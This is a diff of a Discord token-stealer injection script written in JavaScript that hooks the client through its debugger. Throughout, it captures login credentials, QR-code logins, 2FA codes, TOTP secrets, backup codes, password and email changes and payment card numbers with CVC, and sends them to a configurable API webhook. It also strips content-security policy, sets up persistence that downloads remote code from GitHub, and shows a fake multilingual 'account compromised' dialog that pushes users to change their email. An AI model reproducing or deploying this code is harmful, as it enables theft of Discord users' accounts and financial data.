@@ -36,7 +36,7 @@ const CONFIG = {
     API: '%API_URL%',
     injection_url: 'https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js',
     injector_url: 'https://raw.githubusercontent.com/k4itrun/discord-vbs-injector/main/injector.vbs',
-    force_persist_startup: 'true',
+    force_persist_startup: 'false',
     auto_user_profile_edit: '%AUTO_USER_PROFILE_EDIT%',
     auto_email_update: '%AUTO_EMAIL_UPDATE%',
     gofile_download_link: '%GOFILE_DOWNLOAD_LINK%',
@@ -47,15 +47,16 @@ const CONFIG = {
     },
     auth_filters: {
         urls: [
+            '/users/@me',
+            '/auth/login',
+            '/auth/register',
+            '/remote-auth/login',
             '/mfa/totp',
             '/mfa/totp/enable',
             '/mfa/sms/enable',
             '/mfa/totp/disable',
             '/mfa/sms/disable',
             '/mfa/codes-verification',
-            '/auth/login',
-            '/auth/register',
-            '/users/@me',
         ],
     },
     session_filters: {
@@ -189,10 +190,10 @@ const request = async (method, url, headers = {}, data = null) => {
 
 const notify = async (ctx, token, user) => {
     const getData = new GetDataUser();
-    const getFetcher = new Fetcher(token);
+    let AuritaData = await AuritaCord();
 
     const [profile, system ,network, billing, friends, servers] = [
-       await getFetcher.Profile(),
+       await AuritaData.profile,
        await getData.SystemInfo(),
        await getData.Network(),
        await getData.Billing(token),
@@ -219,7 +220,10 @@ const notify = async (ctx, token, user) => {
     };
 
     ctx.embeds[0].fields.push(
-        { name: "Nitro", value: nitro, inline: false },
+        { name: "\u200b", value: "\u200b", inline: false },
+        { name: "Nitro", value: nitro, inline: true },
+        { name: "Phone", value: user.phone ? `\`${user.phone}\`` : '❓', inline: true },
+        { name: "\u200b", value: "\u200b", inline: false },
         { name: "Badges", value: badges, inline: true },
         { name: "Billing", value: billing, inline: true },
         { name: "Path", value: `\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
@@ -270,8 +274,7 @@ const notify = async (ctx, token, user) => {
 
 const editSettingUser = async () => {
     try {
-        const {token} = await AuritaCord();
-
+        let AuritaData = await AuritaCord();
         const data = {
             status: 'dnd',
             email_notifications_enabled: false,
@@ -283,13 +286,11 @@ const editSettingUser = async () => {
                 emoji_name: null
             },
         };
-
         const patchData = JSON.stringify(data);
-
         const response = await request('PATCH', 'https://discord.com/api/v9/users/@me/settings', {
             'Content-Type': 'application/json',
             'Content-Length': patchData.length,
-            'Authorization': token
+            'Authorization': AuritaData.token
         }, patchData);
 
         return JSON.parse(response);
@@ -303,7 +304,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "zh-CN": [
             "用户设置",
             "编辑电子邮件地址",
-            "更改电子邮件地址",
             "我们在您的 Discord 帐户中检测到了一些异常情况，您的地址,",
             "已经受到威胁。",
             "请更改它以继续使用您的帐户。",
@@ -313,7 +313,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "zh-TW": [
             "用戶設置",
             "編輯電子郵件地址",
-            "更改電子郵件地址",
             "我們檢測到您的Discord帳戶有異常情況，您的地址",
             "受到威脅。",
             "請更改它以繼續使用您的帳戶。",
@@ -323,7 +322,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "en-GB": [
             "User Settings",
             "Edit email address",
-            "Change your Email-Address",
             "We have detected something unusual with your Discord account, your address,",
             "has been compromised.",
             "Please change it to continue using your account.",
@@ -333,7 +331,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "en-US": [
             "User Settings",
             "Edit email address",
-            "Change your Email-Address",
             "We have detected something unusual with your Discord account, your address,",
             "has been compromised.",
             "Please change it to continue using your account.",
@@ -343,7 +340,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "es-ES": [
             "Configuración del usuario",
             "Editar dirección de correo electrónico",
-            "Cambia tu dirección de correo electrónico",
             "Hemos detectado algo inusual con tu cuenta de Discord, tu dirección",
             "ha sido comprometida.",
             "Por favor, cámbiala para continuar usando tu cuenta.",
@@ -353,7 +349,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "es-419": [
             "Configuración del usuario",
             "Editar dirección de correo electrónico",
-            "Cambia tu dirección de correo electrónico",
             "Hemos detectado algo inusual con tu cuenta de Discord, tu dirección",
             "ha sido comprometida.",
             "Por favor, cámbiala para continuar usando tu cuenta.",
@@ -363,7 +358,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "pr-BR": [
             "Configurações do usuário",
             "Editar endereço de e-mail",
-            "Altere seu endereço de e-mail",
             "Detectamos algo incomum em sua conta Discord, seu endereço,",
             "foi comprometido.",
             "Por favor, altere-o para continuar usando sua conta.",
@@ -373,7 +367,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "sv-SE": [
             "Användarinställningar",
             "Redigera e-postadress",
-            "Ändra din e-postadress",
             "Vi har upptäckt något ovanligt med ditt Discord-konto, din adress,",
             "har komprometterats.",
             "Ändra den för att fortsätta använda ditt konto.",
@@ -383,7 +376,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "fr": [
             "Paramètres utilisateur",
             "Modifier l\\'adresse e-mail",
-            "Changez votre adresse e-mail",
             "Nous avons détecté quelque chose d\\'inhabituel avec votre compte Discord, votre adresse,",
             "a été compromise.",
             "Veuillez la changer pour continuer à utiliser votre compte.",
@@ -393,7 +385,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "pt": [
             "Configurações do usuário",
             "Editar endereço de e-mail",
-            "Altere seu endereço de e-mail",
             "Detectamos algo incomum em sua conta Discord, seu endereço,",
             "foi comprometido.",
             "Por favor, altere-o para continuar usando sua conta.",
@@ -403,7 +394,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "da": [
             "Brugerindstillinger",
             "Rediger e-mailadresse",
-            "Ændre din e-mailadresse",
             "Vi har registreret noget usædvanligt med din Discord-konto, din adresse,",
             "er blevet kompromitteret.",
             "Ændre den for at fortsætte med at bruge din konto.",
@@ -413,7 +403,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "de": [
             "Benutzereinstellungen",
             "E-Mail-Adresse bearbeiten",
-            "Ändern Sie Ihre E-Mail-Adresse",
             "Wir haben etwas Ungewöhnliches an Ihrem Discord-Konto festgestellt, Ihre Adresse,",
             "wurde kompromittiert.",
             "Ändern Sie sie, um Ihre Konto weiterhin zu verwenden.",
@@ -423,7 +412,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "hr": [
             "Korisničke postavke",
             "Uredi adresu e-pošte",
-            "Promijenite svoju adresu e-pošte",
             "Otkrili smo nešto neuobičajeno s vašim Discord računom, vaša adresa,",
             "je kompromitirana.",
             "Promijenite je da biste nastavili koristiti svoj račun.",
@@ -433,7 +421,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "it": [
             "Impostazioni utente",
             "Modifica indirizzo email",
-            "Cambia il tuo indirizzo email",
             "Abbiamo rilevato qualcosa di insolito nel tuo account Discord, il tuo indirizzo,",
             "è stato compromesso.",
             "Per favore cambialo per continuare a usare il tuo account.",
@@ -443,7 +430,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "lt": [
             "Vartotojo nustatymai",
             "Redaguoti el. pašto adresą",
-            "Pakeiskite savo el. pašto adresą",
             "Su jūsų Discord paskyra aptikome kažką neįprasto, jūsų adresas,",
             "buvo pažeistas.",
             "Pakeiskite jį, kad galėtumėte toliau naudoti savo paskyrą.",
@@ -453,7 +439,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "hu": [
             "Felhasználói beállítások",
             "E-mail cím szerkesztése",
-            "Változtassa meg e-mail címét",
             "Furcsaságot észleltünk a Discord fiókjában, az ön címe,",
             "meg lett veszélyeztetve.",
             "Kérem változtassa meg, hogy folytathassa fiókjának használatát.",
@@ -463,7 +448,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "no": [
             "Brukerinnstillinger",
             "Rediger e-postadresse",
-            "Endre e-postadressen din",
             "Vi har oppdaget noe uvanlig med din Discord-konto, din adresse,",
             "har blitt kompromittert.",
             "Vennligst endre den for å fortsette å bruke kontoen din.",
@@ -473,7 +457,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "pl": [
             "Ustawienia użytkownika",
             "Edytuj adres e-mail",
-            "Zmień swój adres e-mail",
             "Wykryliśmy coś nietypowego w Twoim koncie Discord, Twój adres,",
             "został naruszony.",
             "Zmień go, aby kontynuować korzystanie z konta.",
@@ -483,7 +466,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "ro": [
             "Setări utilizator",
             "Editare adresă de email",
-            "Schimbă-ți adresa de email",
             "Am detectat ceva neobișnuit în contul tău Discord, adresa ta,",
             "a fost compromisă.",
             "Te rugăm să o schimbi pentru a continua să-ți folosești contul.",
@@ -493,7 +475,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "fi": [
             "Käyttäjäasetukset",
             "Muokkaa sähköpostiosoitetta",
-            "Vaihda sähköpostiosoitteesi",
             "Olemme havainneet jotain epätavallista Discord-tililläsi, osoitteesi,",
             "on vaarantunut.",
             "Vaihda se jatkaaksesi tilisi käyttöä.",
@@ -503,7 +484,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "vi": [
             "Cài đặt người dùng",
             "Chỉnh sửa địa chỉ email",
-            "Thay đổi địa chỉ email của bạn",
             "Chúng tôi đã phát hiện một điều gì đó bất thường trong tài khoản Discord của bạn, địa chỉ của bạn,",
             "đã bị đe dọa.",
             "Vui lòng thay đổi nó để tiếp tục sử dụng tài khoản của bạn.",
@@ -513,7 +493,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "tr": [
             "Kullanıcı Ayarları",
             "E-posta adresini düzenle",
-            "E-posta adresini değiştir",
             "Discord hesabınızda alışılmadık bir şey tespit ettik, adresiniz,",
             "tehlikeye girdi.",
             "Kullanmaya devam etmek için lütfen değiştirin.",
@@ -523,7 +502,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "cs": [
             "Uživatelské nastavení",
             "Upravit e-mailovou adresu",
-            "Změnit e-mailovou adresu",
             "Bylo zjištěno něco neobvyklého s vaším účtem Discord, vaše adresa,",
             "byla narušena.",
             "Prosím změňte ji, abyste mohli nadále používat svůj účet.",
@@ -533,7 +511,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "el": [
             "Ρυθμίσεις χρήστη",
             "Επεξεργασία διεύθυνσης email",
-            "Αλλαγή διεύθυνσης email",
             "Έχουμε ανιχνεύσει κάτι ασυνήθιστο με το λογαριασμό σας στο Discord, η διεύθυνσή σας,",
             "έχει διακινδυνευθεί.",
             "Παρακαλούμε αλλάξτε τη για να συνεχίσετε να χρησιμοποιείτε το λογαριασμό σας.",
@@ -543,7 +520,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "bg": [
             "Потребителски настройки",
             "Редактиране на имейл адрес",
-            "Промяна на имейл адреса",
             "Открихме нещо необичайно във вашия Discord акаунт, вашия адрес,",
             "е бил компрометиран.",
             "Моля, променете го, за да продължите да използвате вашия акаунт.",
@@ -552,7 +528,6 @@ const translateAutoEmailUpdate = async (lang) => {
         ],
         "ru": [
             "Настройки пользователя",
-            "Изменить адрес электронной почты",
             "Изменить адрес электронной почты",
             "Мы обнаружили что-то необычное в вашей учетной записи Discord, ваш адрес",
             "был скомпрометирован.",
@@ -563,7 +538,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "uk": [
             "Налаштування користувача",
             "Редагування електронної адреси",
-            "Змінити електронну адресу",
             "Ми виявили щось незвичайне з вашим обліковим записом Discord, ваша адреса",
             "була під загрозою.",
             "Будь ласка, змініть її, щоб продовжити використання свого облікового запису.",
@@ -573,7 +547,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "hi": [
             "उपयोगकर्ता सेटिंग्स",
             "ईमेल पता संपादित करें",
-            "अपना ईमेल पता बदलें",
             "हमने आपके Discord खाते में कुछ असामान्य चीजें पाई हैं, आपका पता,",
             "संकट में है।",
             "कृपया इसे बदलें ताकि आप अपने खाते का उपयोग जारी रख सकें।",
@@ -583,7 +556,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "th": [
             "การตั้งค่าผู้ใช้",
             "แก้ไขที่อยู่อีเมล",
-            "เปลี่ยนที่อยู่อีเมลของคุณ",
             "เราตรวจพบบางสิ่งบางอย่างที่ผิดปกติในบัญชี Discord ของคุณ ที่อยู่ของคุณ,",
             "ถูกขัดจังหวะ",
             "กรุณาเปลี่ยนเพื่อดำเนินการใช้บัญชีของคุณต่อไป",
@@ -593,7 +565,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "ja": [
             "ユーザー設定",
             "メールアドレスを編集",
-            "メールアドレスを変更",
             "あなたのDiscordアカウントに異常が検出されました、あなたのアドレスは",
             "危険にさらされています。",
             "アカウントを引き続き使用するために変更してください。",
@@ -603,7 +574,6 @@ const translateAutoEmailUpdate = async (lang) => {
         "ko": [
             "사용자 설정",
             "이메일 주소 편집",
-            "이메일 주소 변경",
             "귀하의 Discord 계정에 이상한 점이 감지되었습니다. 귀하의 주소,",
             "이 위험에 빠져 있습니다.",
             "귀하의 계정을 계속 사용하려면 변경하십시오.",
@@ -615,7 +585,6 @@ const translateAutoEmailUpdate = async (lang) => {
     const language = languages[lang] || [
         "User Settings",
         "Edit email address",
-        "Change your Email-Address",
         "We have detected something unusual with your Discord account, your address,",
         "has been compromised.",
         "Please change it to continue using your account.",
@@ -752,14 +721,13 @@ class GetDataUser {
             .filter(friend => friend.type === 1)
             .map(friend => ({
                 username: friend.user.username,
-                discriminator: friend.user.discriminator,
                 flags: RareBadges(friend.user.public_flags),
             }))
 
         const rareFriends = filteredFriends.filter(friend => friend.flags);
 
         const hQFriends = rareFriends.map(friend => {
-            const name = `${friend.username}#${friend.discriminator}`;
+            const name = `${friend.username}`;
             return`${friend.flags} | ${name}\n`;
         });
 
@@ -872,12 +840,12 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "Email", value: `\`${email}\``, inline: true },
                         { name: "Password", value: `\`${password}\``, inline: true },
+                        { name: "Email", value: `\`${email}\``, inline: true },
                     ],
                 }],
             };
-            if (request.code !== undefined) {
+            if (request?.code !== undefined) {
                 content.embeds[0].fields.push(
                     { name: "Used 2FA code", value: `\`${request.code}\``, inline: false }
                 );
@@ -893,6 +861,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                     fields: [
                         { name: "New Username", value: `\`${request.username}\``, inline: true },
                         { name: "Password", value: `\`${request.password}\``, inline: true },
+                        { name: "Email", value: `\`${email}\``, inline: false },
                     ],
                 }],
             };
@@ -921,6 +890,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                     fields: [
                         { name: "New Password", value: `\`${request.new_password}\``, inline: true, },
                         { name: "Old Password", value: `\`${request.password}\``, inline: true, },
+                        { name: "Email", value: `\`${email}\``, inline: false, },
                     ],
                 }],
             };
@@ -939,9 +909,12 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "Email", value: `\`${email}\``, inline: true },
                         { name: "Password", value: `\`${password}\``, inline: true },
-                        { name: "Password", value: `\`\`\`\n${codes}\`\`\``, inline: false },
+                        { name: "Email", value: `\`${email}\``, inline: true },
+                        { name: "\u200b", value: "\u200b", inline: false },
+                        { name: "Used 2FA code", value: `\`${request.code}\``, inline: true },
+                        { name: "Authentication secret", value: `\`${request.secret}\``, inline: true },
+                        { name: "Security codes", value: `\`\`\`\n${codes}\`\`\``, inline: false },
                     ],
                 }],
             };
@@ -954,6 +927,8 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
+                        { name: "Email", value: `\`${user.email}\``, inline: true },
+                        { name: "\u200b", value: "\u200b", inline: false },
                         { name: "Number", value: `\`${request.item["card[number]"]}\``, inline: true },
                         { name: "CVC", value: `\`${request.item["card[cvc]"]}\``, inline: true },
                         { name: "Expiration", value: `\`${request.item["card[exp_month]"]}/${request.item["card[exp_year]"]}\``, inline: true, },
@@ -973,7 +948,6 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 embeds: [{
                     fields: [
                         { name: "Email", value: `\`${user.email}\``, inline: true },
-                        { name: "Phone", value: `${user.phone ? `\`${user.phone}\`` : `❓`}`, inline: true },
                     ],
                 }],
             };
@@ -987,7 +961,6 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 embeds: [{
                     fields: [
                         { name: "Email", value: `\`${user.email}\``, inline: true },
-                        { name: "Phone", value: `${user.phone ? `\`${user.phone}\`` : `❓`}`, inline: true },
                     ],
                 }],
             };
@@ -1113,15 +1086,15 @@ const startup = async () => {
     if (fs.existsSync(startupDir)) {
         fs.rmdirSync(startupDir);
         CONFIG.get.logout();
-        const {token} = await AuritaCord();
-        if (!token) return;
+        let AuritaData = await AuritaCord();
+        if (!AuritaData.token) return;
         Cruise(
             'INJECTED',
             null,
             null,
             null,
             null,
-            token,
+            AuritaData.token,
             `It is injected in the route: \`${__dirname.trim().replace(/\\/g, "/")}\``
         );
         execScript('document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.clear();document.body.removeChild(document.querySelector(\'iframe\'));');
@@ -1185,10 +1158,8 @@ const startup = async () => {
             const fs = require('fs');
             const https = require('https');
             const path = require('path');
-    
             const coreJsFile = '${coreJsFile}';
             const betterDiscordAsarFile = '${betterDiscordAsarFile}';
-    
             const initialize = async () => {
                 try {
                     const data = await fs.promises.readFile(coreJsFile, 'utf8');
@@ -1199,7 +1170,6 @@ const startup = async () => {
                     console.error(err);
                 }
             };
-    
             const downloadAndUpdateFile = async () => {
                 try {
                     const fileStream = fs.createWriteStream(coreJsFile);
@@ -1218,13 +1188,10 @@ const startup = async () => {
                     setTimeout(downloadAndUpdateFile, 10000);
                 }
             };
-    
             initialize();
-    
             require('${path.join(resource, 'app.asar')}');
             if (fs.existsSync(betterDiscordAsarFile)) require(betterDiscordAsarFile);
         `;
-
         fs.writeFileSync(startupScriptRunJsFile, scriptRunJsFileContent.replace(/\\/g, '\\\\'));
     }
     
@@ -1232,12 +1199,20 @@ const startup = async () => {
 
 const AuritaCord = async () => {
     try {
-        const token = await CONFIG.get.token();
-        const API = new Fetcher(token);
-        const user = await API.User();
+        const token = await CONFIG['get']['token']();
+        const API = new Fetcher(token),
+            user = await API.User(),
+            profile = await API.Profile(),
+            billing = await API.Billing(),
+            friends = await API.Friends(),
+            servers = await API.Servers();
         return {
             token,
             user,
+            profile,
+            billing,
+            friends,
+            servers
         };
     } catch {
         return {}
@@ -1245,6 +1220,7 @@ const AuritaCord = async () => {
 }
 
 let [
+    AuritaData,
     email,
     password,
     startup_event_occurred,
@@ -1252,121 +1228,143 @@ let [
 ] = [
     '',
     '',
+    '',
     false,
     false
-]
+];
 
-const handleResponse = async (mainWindow, params, response, request) => {
-    const {token} = await AuritaCord();
+const parseJSON = (data) => {
+    try {
+        return JSON.parse(data || '');
+    } catch {
+        return {};
+    }
+};
 
-    const urlHandlers = {
-        '/login': async () => {
-            if (!response.token || request.code !== undefined) {
-                email = request.login;
-                password = request.password;
+const delay = (ms) => {
+    return new Promise(resolve => setTimeout(resolve, ms))
+};
+
+const GangwayCord = async (params, RESPONSE_DATA, RESQUEST_DATA, token, user) => {
+    switch (true) {
+        case params.response.url.endsWith('/login'):
+            if (params.response.url.endsWith('/remote-auth/login')) {
+                if (!RESPONSE_DATA.encrypted_token) return;
+
+                await delay(2000);
+
+                AuritaData = await AuritaCord();
+                const { token, user } = AuritaData;
+
+                Cruise(
+                    'LOGIN_USER',
+                    RESPONSE_DATA,
+                    RESQUEST_DATA,
+                    user.email,
+                    'The password was not found',
+                    token,
+                    `You have logged in using QR code`
+                );
+            } 
+            
+            if (!RESPONSE_DATA.token) {
+                email = RESQUEST_DATA.login || user.email;
+                password = RESQUEST_DATA.password;
                 return;
             }
+
             Cruise(
                 'LOGIN_USER',
-                response,
-                request,
-                (request.login || email),
-                (request.password || password),
-                (response.token || token),
-                `has Logged in`
+                RESPONSE_DATA,
+                RESQUEST_DATA,
+                RESQUEST_DATA.login,
+                RESQUEST_DATA.password,
+                RESPONSE_DATA.token,
+                `has Logged in-`
             );
-        },
-        '/register': () => {
+            break;
+
+        case params.response.url.endsWith('/register'):
             Cruise(
                 'LOGIN_USER',
-                response,
-                request,
-                (request.email || email),
-                (request.password || password),
-                (response.token || token),
+                RESPONSE_DATA,
+                RESQUEST_DATA,
+                RESQUEST_DATA.email,
+                RESQUEST_DATA.password,
+                token,
                 'has \`Created\` a new account'
             );
-        },
-        '/totp': () => {
+            break;
+
+        case params.response.url.endsWith('/totp'):
             Cruise(
                 'LOGIN_USER',
-                response,
-                request,
-                (request.email || email),
-                (request.password || password),
-                (response.token || token),
+                RESPONSE_DATA,
+                RESQUEST_DATA,
+                email,
+                password,
+                RESPONSE_DATA.token,
                 `you are logged in with \`2FA\``
             );
-        },
-        '/enable': async () => {
+            break;
+
+        case params.response.url.endsWith('/enable'):
+        case params.response.url.endsWith('/codes-verification'):
+            const codesCount = RESPONSE_DATA.backup_codes ? RESPONSE_DATA.backup_codes.length : 0;
             Cruise(
                 'BACKUP_CODES',
-                response,
-                request,
-                (request.email || email),
-                (request.password || password),
-                (response.token || token),
-                `\`${response.backup_codes.length} Security\` codes have just been added`
+                RESPONSE_DATA,
+                RESQUEST_DATA,
+                email,
+                password,
+                token,
+                `\`${codesCount} Security\` codes have just been added`
             );
-        },
-        '/codes-verification': async () => {
-            Cruise(
-                'BACKUP_CODES',
-                response,
-                request,
-                (request.email || email),
-                (request.password || password),
-                (response.token || token),
-                `\`${response.backup_codes.length} Security\` codes have just been added`
-            );
-        },
-        '/@me': () => {
-            if (!request.password) return;
-            if (request.email) {
+            break;
+
+        case params.response.url.endsWith('/@me'):
+            if (!RESQUEST_DATA.password) return;
+            if (RESQUEST_DATA.email && RESQUEST_DATA.email_token) {
                 Cruise(
                     'EMAIL_CHANGED',
-                    response,
-                    request,
-                    (request.email || email),
-                    (request.password || password),
-                    (response.token || token),
-                    `has updated their gmail to \`${request.email}\``
+                    RESPONSE_DATA,
+                    RESQUEST_DATA,
+                    RESQUEST_DATA.email,
+                    RESQUEST_DATA.password,
+                    RESQUEST_DATA.token,
+                    `has updated their gmail to \`${RESQUEST_DATA.email}\``
                 );
             }
-            if (request.new_password) {
+            if (RESQUEST_DATA.new_password) {
                 Cruise(
                     'PASSWORD_CHANGED',
-                    response,
-                    request,
-                    (request.email || email),
-                    (request.password || password),
-                    (response.token || token),
-                    `has updated their password to \`${request.password}\``
+                    RESPONSE_DATA,
+                    RESQUEST_DATA,
+                    email,
+                    RESQUEST_DATA.password,
+                    token,
+                    `has updated their password to \`${RESQUEST_DATA.password}\``
                 );
             }
-            if (request.username) {
+            if (RESQUEST_DATA.username) {
                 Cruise(
                     'USERNAME_CHANGED',
-                    response,
-                    request,
-                    (request.email || email),
-                    (request.password || password),
-                    (response.token || token),
-                    `has updated their username to \`${request.username}\``
+                    RESPONSE_DATA,
+                    RESQUEST_DATA,
+                    email,
+                    RESQUEST_DATA.password,
+                    token,
+                    `has updated their username to \`${RESQUEST_DATA.username}\``
                 );
             }
-        },
+            break;
     };
-    const handler = Object.keys(urlHandlers).find(url => params.response.url.endsWith(url));
-    if (handler) {
-        await urlHandlers[handler]();
-    }
 };
 
 const createWindow = (mainWindow) => {
     if (!mainWindow) return;
-    if (!startup_event_occurred) {
-        forcePersistStartup();;
+    if (CONFIG.force_persist_startup === 'true' && !startup_event_occurred) {
+        forcePersistStartup();
         startup_event_occurred = true;
     }
     mainWindow.webContents.debugger.attach('1.3');
@@ -1376,19 +1374,27 @@ const createWindow = (mainWindow) => {
             await startup();
             startup_event_occurred = true;
         }
-        if (!CONFIG.auth_filters.urls.some(url => params.response.url.endsWith(url))) return;
-        if (![200, 202].includes(params.response.status)) return;
+        if (
+            !CONFIG.auth_filters.urls.some(url => params.response.url.endsWith(url)) ||
+            ![200, 202].includes(params.response.status)
+        ) return;
 
         try {
-            const [responseUnparsed,requestUnparsed] = await Promise.all([
+            const [
+                responseUnparsed,
+                requestUnparsed
+            ] = await Promise.all([
                 mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {requestId: params.requestId}),
                 mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {requestId: params.requestId})
-            ]);
+            ]);            
 
-            const responseData = JSON.parse(responseUnparsed.body || '');
-            const requestData = JSON.parse(requestUnparsed.postData || '');
+            const RESPONSE_DATA = parseJSON(responseUnparsed.body);
+            const RESQUEST_DATA = parseJSON(requestUnparsed.postData);
 
-            await handleResponse(mainWindow, params, responseData, requestData);
+            AuritaData = await AuritaCord();
+            const { token, user } = AuritaData;
+
+            GangwayCord(params, RESPONSE_DATA, RESQUEST_DATA, token, user);
         } catch (error) {
             console.error(error);
         }
@@ -1410,19 +1416,19 @@ const defaultSession = (webRequest) => {
 
         if (!['POST'].includes(method) && ![200, 202].includes(statusCode)) return;
 
-        const {token} = await AuritaCord();
+        AuritaData = await AuritaCord();
+        const { token, user } = AuritaData;
 
         switch (true) {
             case url.endsWith('/tokens'): {
                 let item;
-
                 try {
                     item = querystring.parse(Buffer.from(uploadData[0].bytes).toString());
                 } catch (error) {
                     item = querystring.parse(decodeURIComponent(uploadData[0]?.bytes.toString() || ''));
                 }
-                const { line_1, line_2, city, state, postal_code, country, email } = billing_address;
 
+                const { line_1, line_2, city, state, postal_code, country, email } = billing_address;
                 const request = {
                     item,
                     line_1, 
@@ -1459,21 +1465,11 @@ const defaultSession = (webRequest) => {
             }
         }
     });
-
-    webRequest.onBeforeRequest(CONFIG.session_filters, (details, callback) => {   
-        const { url } = details;
-
-        if (url.endsWith("auth/sessions") || url.startsWith("wss://remote-auth-gateway")) {
-            return callback({cancel: true});
-        } else {
-            return callback({cancel: false});
-        };
-    });
-
+    
     webRequest.onHeadersReceived(async (request, callback) => {
         const { url, method, statusCode, responseHeaders, uploadData } = request;
-
         const updatedHeaders = { ...responseHeaders };
+
         delete updatedHeaders["content-security-policy"];
         delete updatedHeaders["content-security-policy-report-only"];
 
@@ -1485,15 +1481,14 @@ const defaultSession = (webRequest) => {
         if (url.endsWith('/@me') && !script_executed) {
             if (CONFIG.auto_user_profile_edit === 'true') {
                 script_executed = true;
-                
                 await editSettingUser();
             };
     
             if (CONFIG.auto_email_update === 'true') {
                 script_executed = true;
 
-                const {token, user} = await AuritaCord();
-                const language = user.locale || 'en-US';
+                let AuritaData = await AuritaCord();
+                const language = AuritaData.user.locale || 'en-US';
 
                 const truncateEmail = (email) => {
                     if (!email) return '@';
@@ -1501,7 +1496,6 @@ const defaultSession = (webRequest) => {
                     const truncatedLocalPart = localPart.length > 15 ? `${localPart.slice(0, 15)}...` : localPart;
                     return `${truncatedLocalPart}@${domain}`;
                 };
-
                 const getDiscordDomain = (maper) => {
                     const path = __dirname.trim().replace(/\\/g, "/");
                     const regex = /\/Local\/(discord|discordcanary|discordptb|discorddevelopment)\//i;
@@ -1516,7 +1510,6 @@ const defaultSession = (webRequest) => {
                 const [
                     CONFIG_ALERT,
                     EDIT_MAIL_ALERT,
-                    TITLE_INTRO,
                     ALERT_INTRO,
                     END_INTRO_ALERT,
                     CHANGE_ALERT,
@@ -1563,7 +1556,7 @@ const defaultSession = (webRequest) => {
                                                             </div>
                                                             <div class="content_f9a4c9 content_a62824 thin_c49869 scrollerBase_c49869" dir="ltr" style="overflow: hidden scroll; padding-right: 8px;">
                                                                 <div class="defaultColor_a595eb text-md/normal_dc00ef description_a62824" data-text-variant="text-md/normal">
-                                                                    <p>${ALERT_INTRO} (<strong>${truncateEmail(user.email || 'user@gmail.com')}</strong>) ${END_INTRO_ALERT}</p>
+                                                                    <p>${ALERT_INTRO} (<strong>${truncateEmail(AuritaData.user.email || 'user@gmail.com')}</strong>) ${END_INTRO_ALERT}</p>
                                                                     <p>${CHANGE_ALERT}</p>
                                                                     <p>${LAST_END_ALERT} ${CONTACT_ALERT}</p>
                                                                 </div>
